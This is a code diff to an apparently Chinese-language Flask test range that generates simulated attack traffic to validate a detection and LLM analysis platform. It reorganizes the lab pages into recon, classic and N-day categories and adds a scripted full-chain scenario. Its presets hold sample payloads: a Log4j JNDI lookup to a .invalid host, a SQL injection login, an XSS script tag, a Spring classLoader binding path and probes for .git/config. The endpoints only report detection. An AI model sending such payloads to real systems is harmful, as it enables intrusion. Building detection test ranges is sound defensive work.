@@ -344,23 +344,147 @@ LAB_PAGES: Dict[str, Dict[str, Any]] = {
 }
 
 
+LAB_CATEGORIES: Dict[str, Dict[str, Any]] = {
+    "recon": {
+        "title": "信息收集",
+        "summary": "资产发现、目录枚举与端口特征采集",
+        "pages": ["recon-directory", "recon-port", "graphql"],
+    },
+    "classic": {
+        "title": "经典漏洞",
+        "summary": "验证应用层常见漏洞的检测与研判链路",
+        "pages": ["sql", "xss", "upload", "command", "traversal", "ssrf", "xxe", "ssti", "deserialize", "bruteforce"],
+    },
+    "nday": {
+        "title": "N-day 特征模拟",
+        "summary": "依据公开安全公告构造不可执行的识别特征",
+        "pages": ["nday-fastjson", "nday-log4j", "nday-spring", "nday-shiro"],
+    },
+    "unknown": {
+        "title": "未知威胁模拟",
+        "summary": "用新颖结构与异常编码测试未知攻击发现能力",
+        "pages": ["unknown-structure"],
+    },
+}
+
+
+LAB_PAGES.update(
+    {
+        "recon-directory": {
+            "title": "目录枚举测试",
+            "tag": "信息收集 / 目录字典 / 暴露面",
+            "desc": "模拟对管理入口、备份目录和开发残留路径的枚举。请求只访问本靶场，不读取服务器真实文件。",
+            "endpoint": "/api/recon/directory",
+            "presets": [
+                {"name": "管理入口字典", "method": "GET", "url": "/api/recon/directory?path=/admin", "contentType": "", "body": None},
+                {"name": "版本库残留", "method": "GET", "url": "/api/recon/directory?path=/.git/config", "contentType": "", "body": None},
+                {"name": "配置与文档", "method": "GET", "url": "/api/recon/directory?path=/swagger-ui", "contentType": "", "body": None},
+            ],
+        },
+        "recon-port": {
+            "title": "端口扫描特征",
+            "tag": "信息收集 / 端口清单 / 服务指纹",
+            "desc": "以 HTTP 请求模拟扫描器提交的端口清单，便于在不主动扫描外部主机的情况下验证端口扫描识别规则。",
+            "endpoint": "/api/recon/ports",
+            "presets": [
+                {"name": "常见服务端口", "method": "POST", "url": "/api/recon/ports", "contentType": "application/json", "body": {"scan_mode": "connect", "ports": [22, 80, 443, 3306, 6379, 8080]}},
+                {"name": "Web 服务端口", "method": "POST", "url": "/api/recon/ports", "contentType": "application/json", "body": {"scan_mode": "service-fingerprint", "ports": [80, 443, 8000, 8080, 8443]}},
+            ],
+        },
+        "nday-fastjson": {
+            "title": "Fastjson 风险特征",
+            "tag": "N-day / AutoType / 安全模拟",
+            "desc": "依据 Fastjson 官方安全公告模拟 AutoType 类型标记。使用不可执行的 SafeProbe 类名，不包含 Gadget 或回连行为。",
+            "endpoint": "/api/nday/fastjson/parse",
+            "reference": "https://github.com/alibaba/fastjson/wiki/security_update_20220523",
+            "presets": [
+                {"name": "AutoType 类型标记", "method": "POST", "url": "/api/nday/fastjson/parse", "contentType": "application/json", "body": {"@type": "com.example.SafeProbe", "marker": "FASTJSON-CVE-SIM"}},
+                {"name": "正常 JSON", "method": "POST", "url": "/api/nday/fastjson/parse", "contentType": "application/json", "body": {"name": "normal-request", "safe": True}},
+            ],
+        },
+        "nday-log4j": {
+            "title": "Log4j Lookup 特征",
+            "tag": "N-day / JNDI Lookup / 安全模拟",
+            "desc": "模拟 Log4j 公告中的 JNDI Lookup 文本特征，目标域名固定为 .invalid，不会解析或建立外连。",
+            "endpoint": "/api/nday/log4j/search",
+            "reference": "https://logging.apache.org/security.html",
+            "presets": [
+                {"name": "JNDI Lookup 标记", "method": "POST", "url": "/api/nday/log4j/search", "contentType": "application/json", "body": {"query": "${jndi:ldap://probe.invalid/LOG4J-CVE-SIM}"}},
+                {"name": "普通搜索词", "method": "POST", "url": "/api/nday/log4j/search", "contentType": "application/json", "body": {"query": "security documentation"}},
+            ],
+        },
+        "nday-spring": {
+            "title": "Spring 数据绑定特征",
+            "tag": "N-day / Data Binding / 安全模拟",
+            "desc": "模拟 Spring 官方公告涉及的数据绑定参数形态，只返回识别结果，不执行文件写入或类加载。",
+            "endpoint": "/api/nday/spring/bind",
+            "reference": "https://spring.io/security/cve-2022-22965/",
+            "presets": [
+                {"name": "数据绑定路径标记", "method": "POST", "url": "/api/nday/spring/bind", "contentType": "application/json", "body": {"field": "class.module.classLoader", "marker": "SPRING-CVE-SIM"}},
+                {"name": "普通表单绑定", "method": "POST", "url": "/api/nday/spring/bind", "contentType": "application/json", "body": {"field": "profile.displayName", "value": "tester"}},
+            ],
+        },
+        "nday-shiro": {
+            "title": "Shiro 会话特征",
+            "tag": "N-day / 认证会话 / 安全模拟",
+            "desc": "模拟 Apache Shiro 历史认证与会话类公告中的请求形态，不携带序列化 Gadget，不尝试绕过真实认证。",
+            "endpoint": "/api/nday/shiro/session",
+            "reference": "https://shiro.apache.org/security-reports.html",
+            "presets": [
+                {"name": "RememberMe 安全探针", "method": "POST", "url": "/api/nday/shiro/session", "contentType": "application/json", "body": {"rememberMe": "SAFE_SHIRO_PROBE", "path": "/admin/"}},
+                {"name": "普通会话检查", "method": "POST", "url": "/api/nday/shiro/session", "contentType": "application/json", "body": {"rememberMe": False, "path": "/profile"}},
+            ],
+        },
+        "unknown-structure": {
+            "title": "未知威胁结构模拟",
+            "tag": "未知威胁 / 零日特征模拟 / 异常结构",
+            "desc": "组合深层嵌套、异常类型切换和高熵标记，测试模型能否发现未被传统规则完整覆盖的新颖请求。该模块不宣称存在未公开漏洞。",
+            "endpoint": "/api/unknown/probe",
+            "presets": [
+                {"name": "深层嵌套异常", "method": "POST", "url": "/api/unknown/probe", "contentType": "application/json", "body": {"marker": "ZERO_DAY_BEHAVIOR_SIM", "nested_depth": 18, "payload": {"a": [{"b": {"c": ["UNKNOWN-THREAT-SIM"]}}]}}},
+                {"name": "多编码边界", "method": "POST", "url": "/api/unknown/probe", "contentType": "application/json", "body": {"marker": "UNKNOWN-THREAT-SIM", "encoding": ["percent", "unicode", "base64"], "value": "%255c%2575FF1C"}},
+            ],
+        },
+    }
+)
+
+
+FULL_CHAIN_SCENARIO = [
+    {"label": "端口特征收集", "method": "POST", "url": "/api/recon/ports", "contentType": "application/json", "body": {"scan_mode": "connect", "ports": [22, 80, 443, 3306, 6379]}},
+    {"label": "目录枚举", "method": "GET", "url": "/api/recon/directory?path=/.git/config", "contentType": "", "body": None},
+    {"label": "弱口令尝试", "method": "POST", "url": "/api/auth/login", "contentType": "application/json", "body": {"username": "admin", "password": "123456"}},
+    {"label": "SQL 注入尝试", "method": "POST", "url": "/api/auth/login", "contentType": "application/json", "body": {"username": "admin", "password": "' or 1=1 -- "}},
+    {"label": "XSS 尝试", "method": "GET", "url": "/api/search?q=<script>alert(1)</script>", "contentType": "", "body": None},
+    {"label": "Fastjson 特征", "method": "POST", "url": "/api/nday/fastjson/parse", "contentType": "application/json", "body": {"@type": "com.example.SafeProbe", "marker": "FASTJSON-CVE-SIM"}},
+    {"label": "未知威胁结构", "method": "POST", "url": "/api/unknown/probe", "contentType": "application/json", "body": {"marker": "ZERO_DAY_BEHAVIOR_SIM", "nested_depth": 18}},
+]
+
+
 def render_lab_page(kind: str = "home") -> str:
     page = LAB_PAGES.get(kind)
     is_home = page is None
     active = kind if not is_home else "home"
-    nav_items = ['<a class="nav-item {cls}" href="/">总览</a>'.format(cls="active" if active == "home" else "")]
-    for key, cfg in LAB_PAGES.items():
-        cls = "active" if active == key else ""
-        nav_items.append(f'<a class="nav-item {cls}" href="/{key}">{escape(cfg["title"])}</a>')
+    nav_items = ['<a class="nav-item nav-home {cls}" href="/">全链路总览</a>'.format(cls="active" if active == "home" else "")]
+    for category in LAB_CATEGORIES.values():
+        nav_items.append(f'<div class="nav-heading">{escape(category["title"])}</div>')
+        for key in category["pages"]:
+            cfg = LAB_PAGES[key]
+            cls = "active" if active == key else ""
+            nav_items.append(f'<a class="nav-item {cls}" href="/{key}">{escape(cfg["title"])}</a>')
 
     if is_home:
-        title = "综合漏洞测试靶场"
-        tag = "SQL / XSS / 上传 / SSRF / 命令注入 / 更多"
-        desc = "这是给 AI 攻击态势感知平台准备的多页面测试靶场。每个页面都能一键发送典型攻击请求，方便观察 input、result、大模型分析和数据库大屏刷新。"
-        cards = "\n".join(
-            f'<a class="lab-card" href="/{key}"><span>{escape(cfg["tag"])}</span><strong>{escape(cfg["title"])}</strong><p>{escape(cfg["desc"])}</p></a>'
-            for key, cfg in LAB_PAGES.items()
-        )
+        title = "攻击链验证工作台"
+        tag = "RECON → ACCESS → EXPLOIT → UNKNOWN"
+        desc = "按真实渗透阶段组织测试流量，从信息收集到经典漏洞、公开 N-day 特征与未知威胁结构，完整验证抓包、检测、关联、LLM/RAG 研判和态势展示。"
+        category_sections = []
+        for index, category in enumerate(LAB_CATEGORIES.values(), start=1):
+            cards = "\n".join(
+                f'<a class="lab-card" href="/{key}"><span>{escape(LAB_PAGES[key]["tag"])}</span><strong>{escape(LAB_PAGES[key]["title"])}</strong><p>{escape(LAB_PAGES[key]["desc"])}</p><i>打开模块</i></a>'
+                for key in category["pages"]
+            )
+            category_sections.append(
+                f'<section class="phase"><header><b>{index}</b><div><h2>{escape(category["title"])}</h2><p>{escape(category["summary"])}</p></div></header><div class="grid">{cards}</div></section>'
+            )
         main = f"""
           <section class="hero">
             <div>
@@ -368,14 +492,16 @@ def render_lab_page(kind: str = "home") -> str:
               <h1>{escape(title)}</h1>
               <p>{escape(desc)}</p>
             </div>
-            <div class="status-card">
-              <b>服务状态</b>
-              <span class="pulse"></span>
-              <p>运行中 · 端口由启动脚本配置</p>
-              <code>/health</code>
+            <div class="scenario-card">
+              <span>全链路场景</span>
+              <b>7 个阶段化动作</b>
+              <p>从侦察到未知威胁模拟，按顺序发送并实时显示进度。</p>
+              <button id="runScenario" class="primary" type="button">开始全链路模拟</button>
+              <div id="scenarioProgress" class="scenario-progress">等待执行</div>
             </div>
           </section>
-          <section class="grid">{cards}</section>
+          {''.join(category_sections)}
+          <aside class="safety-note"><b>安全边界</b><p>N-day 与未知威胁模块只生成不可执行特征，不包含回连、落地、命令执行或未公开漏洞利用代码。</p></aside>
         """
         presets_json = "[]"
     else:
@@ -387,6 +513,8 @@ def render_lab_page(kind: str = "home") -> str:
             f'<button class="preset" data-index="{idx}"><span>{idx + 1:02d}</span>{escape(str(item["name"]))}</button>'
             for idx, item in enumerate(page["presets"])
         )
+        reference = str(page.get("reference") or "")
+        reference_html = f'<a class="reference-link" href="{escape(reference)}" target="_blank" rel="noreferrer">查看官方安全公告</a>' if reference else ""
         main = f"""
           <section class="hero compact">
             <div>
@@ -394,9 +522,10 @@ def render_lab_page(kind: str = "home") -> str:
               <h1>{escape(title)}</h1>
               <p>{escape(desc)}</p>
             </div>
-            <div class="status-card">
-              <b>目标接口</b>
+            <div class="endpoint-block">
+              <span>目标接口</span>
               <code>{escape(str(page["endpoint"]))}</code>
+              {reference_html}
             </div>
           </section>
           <section class="tester">
@@ -488,6 +617,65 @@ def render_lab_page(kind: str = "home") -> str:
     .result-panel{{background:var(--panel2)}} .meta{{color:var(--muted);margin-bottom:12px;min-height:22px}}
     pre{{min-height:480px;max-height:680px;overflow:auto;white-space:pre-wrap;word-break:break-word;background:#020617;border:1px solid rgba(125,211,252,.2);border-radius:18px;padding:18px;color:#d8f8ff;line-height:1.6}}
     @media (max-width:1100px){{.app{{grid-template-columns:1fr}}aside{{position:relative}}.grid{{grid-template-columns:1fr}}.tester{{grid-template-columns:1fr}}.hero{{flex-direction:column}}}}
+
+    /* Taste Skill audit: dark technical workbench, not a generic AI landing page. */
+    :root{{--lab-bg:#0d0f10;--lab-surface:#141718;--lab-surface-2:#191d1e;--lab-line:#303638;--lab-text:#f1f3f2;--lab-muted:#9ca5a4;--lab-accent:#ff7a45}}
+    body{{background:var(--lab-bg);color:var(--lab-text)}}
+    body:before{{opacity:.16;background-image:linear-gradient(rgba(255,255,255,.045) 1px,transparent 1px);background-size:100% 32px;mask-image:none}}
+    .app{{grid-template-columns:248px minmax(0,1fr)}}
+    aside{{position:sticky;top:0;height:100dvh;overflow:auto;padding:24px 16px;border-color:var(--lab-line);background:#101314;backdrop-filter:none}}
+    .brand{{align-items:flex-start;margin-bottom:26px;padding:0 7px 22px;border-bottom:1px solid var(--lab-line)}}
+    .logo{{width:34px;height:34px;border-radius:8px;background:var(--lab-accent);box-shadow:none}}
+    .brand b{{font-size:15px}}.brand small{{color:#7f8988;font-size:10px}}
+    .nav-heading{{margin:22px 10px 7px;color:#66706f;font-size:9px;letter-spacing:.14em}}
+    .nav-item{{padding:9px 10px;margin:1px 0;border-radius:7px;color:#9ca5a4;font-size:12px}}
+    .nav-item:hover{{transform:translateX(2px);color:var(--lab-text);border-color:transparent;background:#1a1e1f}}
+    .nav-item.active{{color:#111;background:var(--lab-accent);border-color:transparent;box-shadow:none}}
+    .nav-home{{margin-bottom:12px}}
+    main{{max-width:1440px;padding:34px clamp(22px,4vw,64px) 80px}}
+    .hero{{min-height:300px;align-items:flex-end;margin-bottom:54px;padding:8px 0 36px;border:0;border-bottom:1px solid var(--lab-line);border-radius:0;background:transparent;box-shadow:none}}
+    .hero.compact{{min-height:220px;padding:8px 0 28px}}
+    .eyebrow{{color:var(--lab-accent);font-size:10px;letter-spacing:.12em}}
+    .eyebrow:before{{display:none}}
+    h1{{max-width:820px;margin:18px 0 18px;font-size:clamp(42px,6vw,82px);font-weight:650;letter-spacing:-.055em}}
+    .hero.compact h1{{font-size:clamp(38px,5vw,68px)}}
+    .hero p{{max-width:740px;color:var(--lab-muted);font-size:15px;line-height:1.75}}
+    .scenario-card,.endpoint-block{{width:min(360px,100%);padding:22px;border:1px solid var(--lab-line);border-radius:12px;background:var(--lab-surface)}}
+    .scenario-card>span,.endpoint-block>span{{display:block;color:var(--lab-accent);font-size:10px;letter-spacing:.08em}}
+    .scenario-card>b{{display:block;margin:10px 0 8px;font-size:22px}}.scenario-card p{{font-size:12px;line-height:1.6}}
+    .scenario-progress{{min-height:20px;margin-top:12px;color:var(--lab-muted);font:11px Consolas,monospace}}
+    .endpoint-block{{display:grid;align-content:center;gap:12px}}
+    code{{color:#f2d0c0;border-color:#4d3a31;border-radius:6px;background:#211813}}
+    .reference-link{{color:var(--lab-muted);font-size:11px;text-decoration-color:var(--lab-accent);text-underline-offset:4px}}
+    .phase{{margin:0 0 58px}}
+    .phase>header{{display:grid;grid-template-columns:44px minmax(0,1fr);gap:18px;align-items:start;margin-bottom:18px}}
+    .phase>header>b{{display:grid;place-items:center;width:36px;height:36px;border:1px solid var(--lab-line);border-radius:8px;color:var(--lab-accent);font:12px Consolas,monospace}}
+    .phase h2{{margin:0 0 5px;font-size:26px;letter-spacing:-.03em}}.phase header p{{margin:0;color:var(--lab-muted);font-size:12px}}
+    .grid{{grid-template-columns:repeat(12,minmax(0,1fr));gap:1px;border:1px solid var(--lab-line);border-radius:12px;overflow:hidden;background:var(--lab-line)}}
+    .lab-card{{grid-column:span 4;min-height:210px;padding:22px;border:0;border-radius:0;background:var(--lab-surface);box-shadow:none}}
+    .lab-card:nth-child(5n+1){{grid-column:span 6}}.lab-card:nth-child(5n+2){{grid-column:span 6}}
+    .lab-card:after{{display:none}}.lab-card:hover{{transform:none;background:var(--lab-surface-2);box-shadow:inset 0 -3px var(--lab-accent)}}
+    .lab-card span{{color:#7f8988;font-size:9px}}.lab-card strong{{margin:20px 0 10px;font-size:22px}}.lab-card p{{color:var(--lab-muted);font-size:12px;line-height:1.65}}
+    .lab-card i{{position:absolute;left:22px;bottom:18px;color:var(--lab-accent);font-size:10px;font-style:normal;opacity:0;transform:translateY(4px);transition:.18s ease}}
+    .lab-card:hover i{{opacity:1;transform:translateY(0)}}
+    .safety-note{{display:grid;grid-template-columns:120px minmax(0,1fr);gap:22px;padding:20px 0;border-top:1px solid var(--lab-line);color:var(--lab-muted);font-size:12px;line-height:1.7}}
+    .safety-note b{{color:var(--lab-text)}}.safety-note p{{margin:0}}
+    .tester{{grid-template-columns:minmax(380px,.9fr) minmax(440px,1.1fr);gap:1px;border:1px solid var(--lab-line);border-radius:12px;overflow:hidden;background:var(--lab-line)}}
+    .panel{{padding:26px;border:0;border-radius:0;background:var(--lab-surface);box-shadow:none}}
+    .result-panel{{background:#101314}}.preset-list{{gap:4px}}
+    .preset{{border-color:transparent;border-radius:7px;background:#0f1213;color:#ccd1d0}}
+    .preset:hover,.preset.active{{transform:translateX(2px);border-color:#69432f;background:#241a16}}
+    .preset span{{color:var(--lab-accent)}}
+    label{{color:#b5bdbc;font-size:12px}}
+    input,select,textarea{{border-color:var(--lab-line);border-radius:7px;background:#0d1011;color:var(--lab-text)}}
+    input:focus,select:focus,textarea:focus{{border-color:var(--lab-accent);box-shadow:0 0 0 3px rgba(255,122,69,.1)}}
+    button.primary,button.secondary{{border-radius:7px}}
+    button.primary{{color:#17100c;background:var(--lab-accent);box-shadow:none}}
+    button.secondary{{border-color:var(--lab-line);background:#1b1f20}}
+    button.primary:hover,button.secondary:hover{{transform:translateY(-1px);filter:none}}button.primary:active,button.secondary:active{{transform:scale(.98)}}
+    pre{{border-color:var(--lab-line);border-radius:8px;background:#090b0c;color:#d8dddc}}
+    @media(max-width:1100px){{.app{{grid-template-columns:1fr}}aside{{position:relative;height:auto}}.grid{{grid-template-columns:1fr}}.lab-card,.lab-card:nth-child(n){{grid-column:auto}}.tester{{grid-template-columns:1fr}}.hero{{flex-direction:column;align-items:flex-start}}}}
+    @media(prefers-reduced-motion:reduce){{*{{scroll-behavior:auto!important;animation:none!important;transition:none!important}}}}
   </style>
 </head>
 <body>
@@ -500,6 +688,7 @@ def render_lab_page(kind: str = "home") -> str:
   </div>
   <script>
     const presets = {presets_json};
+    const fullChainScenario = {json.dumps(FULL_CHAIN_SCENARIO, ensure_ascii=False).replace("</", "<\\/")};
     const methodEl = document.getElementById("method");
     const urlEl = document.getElementById("url");
     const contentTypeEl = document.getElementById("contentType");
@@ -563,6 +752,35 @@ def render_lab_page(kind: str = "home") -> str:
     }}
     document.getElementById("send")?.addEventListener("click", sendRequest);
     document.getElementById("copy")?.addEventListener("click", copyCurl);
+    const runScenarioButton = document.getElementById("runScenario");
+    const scenarioProgress = document.getElementById("scenarioProgress");
+    function wait(ms) {{ return new Promise(resolve => setTimeout(resolve, ms)); }}
+    async function runFullChainScenario() {{
+      if (!runScenarioButton || !scenarioProgress) return;
+      runScenarioButton.disabled = true;
+      runScenarioButton.textContent = "场景执行中";
+      let completed = 0;
+      try {{
+        for (const [index, item] of fullChainScenario.entries()) {{
+          scenarioProgress.textContent = `${{index + 1}}/${{fullChainScenario.length}} · ${{item.label}}`;
+          const options = {{ method: item.method || "GET", headers: {{ "X-Traffic-Lab-Scenario": "full-chain-safe-sim" }} }};
+          if (options.method !== "GET" && options.method !== "HEAD") {{
+            if (item.contentType) options.headers["Content-Type"] = item.contentType;
+            options.body = typeof item.body === "string" ? item.body : JSON.stringify(item.body || {{}});
+          }}
+          await fetch(item.url, options);
+          completed += 1;
+          await wait(680);
+        }}
+        scenarioProgress.textContent = `已完成 ${{completed}} 个阶段，等待态势关联引擎处理`;
+      }} catch (error) {{
+        scenarioProgress.textContent = `执行中断：${{String(error)}}`;
+      }} finally {{
+        runScenarioButton.disabled = false;
+        runScenarioButton.textContent = "再次执行全链路";
+      }}
+    }}
+    runScenarioButton?.addEventListener("click", runFullChainScenario);
   </script>
 </body>
 </html>"""
@@ -748,6 +966,89 @@ def graphql():
     if has_any(query, ["__schema", "union select", " or 1=1", "sleep("]):
         return jsonify({"ok": True, "data": {"debug": "enabled", "rows": [{"id": 1}, {"id": 2}]}})
     return jsonify({"ok": True, "data": {"viewer": {"id": 1001, "name": "guest"}}})
+
+
+@app.get("/api/recon/directory")
+def recon_directory():
+    path_text = str(request.args.get("path", "/")).strip()[:256]
+    known = {
+        "/admin": (403, "restricted"),
+        "/.git/config": (200, "repository metadata simulated"),
+        "/swagger-ui": (200, "api documentation simulated"),
+        "/backup": (403, "restricted"),
+    }
+    status, note = known.get(path_text, (404, "not found"))
+    return jsonify({"ok": status < 400, "path": path_text, "status": status, "note": note, "simulation": True}), status
+
+
+@app.post("/api/recon/ports")
+def recon_ports():
+    body = request.get_json(silent=True) or {}
+    ports = [int(value) for value in body.get("ports", []) if str(value).isdigit()][:64]
+    simulated = [
+        {"port": port, "state": "open" if port in {22, 80, 443, 3306, 8080} else "filtered"}
+        for port in ports
+    ]
+    return jsonify(
+        {
+            "ok": True,
+            "scan_mode": str(body.get("scan_mode") or "connect"),
+            "results": simulated,
+            "simulation": True,
+            "note": "未对任何外部主机执行真实端口扫描",
+        }
+    )
+
+
+@app.post("/api/nday/fastjson/parse")
+def nday_fastjson():
+    body = request.get_json(silent=True) or {}
+    marker = str(body.get("marker") or "")
+    type_name = str(body.get("@type") or "")
+    detected = type_name == "com.example.SafeProbe" or marker == "FASTJSON-CVE-SIM"
+    return jsonify({"ok": True, "detected": detected, "simulation": True, "executed": False, "family": "Fastjson AutoType"})
+
+
+@app.post("/api/nday/log4j/search")
+def nday_log4j():
+    body = request.get_json(silent=True) or {}
+    query = str(body.get("query") or "")[:2048]
+    detected = "${jndi:" in query.lower() and ".invalid" in query.lower()
+    return jsonify({"ok": True, "detected": detected, "simulation": True, "resolved": False, "family": "Log4j JNDI Lookup"})
+
+
+@app.post("/api/nday/spring/bind")
+def nday_spring():
+    body = request.get_json(silent=True) or {}
+    field = str(body.get("field") or "")[:512]
+    detected = "class.module.classloader" in field.lower() or str(body.get("marker") or "") == "SPRING-CVE-SIM"
+    return jsonify({"ok": True, "detected": detected, "simulation": True, "bound": False, "family": "Spring Data Binding"})
+
+
+@app.post("/api/nday/shiro/session")
+def nday_shiro():
+    body = request.get_json(silent=True) or {}
+    marker = str(body.get("rememberMe") or "")
+    detected = marker == "SAFE_SHIRO_PROBE"
+    return jsonify({"ok": True, "detected": detected, "simulation": True, "authenticated": False, "family": "Apache Shiro session"})
+
+
+@app.post("/api/unknown/probe")
+def unknown_probe():
+    body = request.get_json(silent=True) or {}
+    marker = str(body.get("marker") or "")
+    depth = int(body.get("nested_depth") or 0)
+    detected = marker in {"ZERO_DAY_BEHAVIOR_SIM", "UNKNOWN-THREAT-SIM"} or depth >= 12
+    return jsonify(
+        {
+            "ok": True,
+            "detected": detected,
+            "simulation": True,
+            "executed": False,
+            "classification": "unknown-threat-structure",
+            "note": "用于未知威胁检测回归，不代表真实未公开漏洞",
+        }
+    )
 
 
 @app.route("/api/admin/reset", methods=["GET", "POST"])
